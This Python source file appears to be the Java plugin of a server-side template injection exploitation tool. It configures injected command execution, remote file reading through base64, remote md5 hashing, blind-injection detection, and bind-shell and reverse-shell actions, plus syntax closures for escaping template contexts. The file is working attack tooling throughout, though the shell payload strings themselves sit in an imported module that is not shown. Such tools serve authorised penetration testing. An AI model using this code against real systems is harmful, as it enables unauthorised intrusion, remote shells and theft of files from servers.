from core.plugin import Plugin
from plugins.languages import bash
from utils import closures
from utils import rand
import re

class Java(Plugin):

    def language_init(self):

        self.update_actions({
        
            'execute' : {
                'test_cmd': bash.printf % { 's1': rand.randstrings[2] },
                'test_cmd_expected': rand.randstrings[2],
                'test_os' : """uname""",
                'test_os_expected': '^[\w-]+$'
            },
        
            'read' : {
                'call': 'execute',
                'read' : """base64<'%(path)s'"""
            },
            'md5' : {
                'call': 'execute',
                'md5': """$(type -p md5 md5sum)<'%(path)s'|head -c 32"""
            },
            # Prepared to used only for blind detection. Not useful for time-boolean
            # tests (since && characters can\'t be used) but enough for the detection phase.
            'blind' : {
                'call': 'execute_blind',
                'test_bool_true' : 'true',
                'test_bool_false' : 'false'
            },
            'bind_shell' : {
                'call' : 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell' : {
                'call': 'execute_blind',
                'reverse_shell' : bash.reverse_shell
            }
        })

    language = 'java'

    def rendered_detected(self):
        
        # Java has no eval() function, hence the checks are done using
        # the command execution action.

        test_cmd_code = self.actions.get('execute', {}).get('test_cmd')
        test_cmd_code_expected = self.actions.get('execute', {}).get('test_cmd_expected')

        if (
            test_cmd_code and 
            test_cmd_code_expected and
            test_cmd_code_expected == self.execute(test_cmd_code)
            ):
            self.set('execute', True)
            self.set('write', True)
            self.set('read', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)

            test_os_code = self.actions.get('execute', {}).get('test_os')
            test_os_code_expected = self.actions.get('execute', {}).get('test_os_expected')

            if test_os_code and test_os_code_expected:
            
                os = self.execute(test_os_code)
                if os and re.search(test_os_code_expected, os):
                    self.set('os', os)

    def blind_detected(self):

        # No blind code evaluation is possible here, only execution

        # Since execution has been used to detect blind injection,
        # let's assume execute_blind as set.
        self.set('execute_blind', True)
        self.set('write', True)
        self.set('bind_shell', True)
        self.set('reverse_shell', True)


ctx_closures = {
        1: [
            closures.close_single_duble_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var  + closures.true_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_duble_quotes + closures.integer + closures.string + closures.var + closures.true_var + closures.iterable_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ]
}
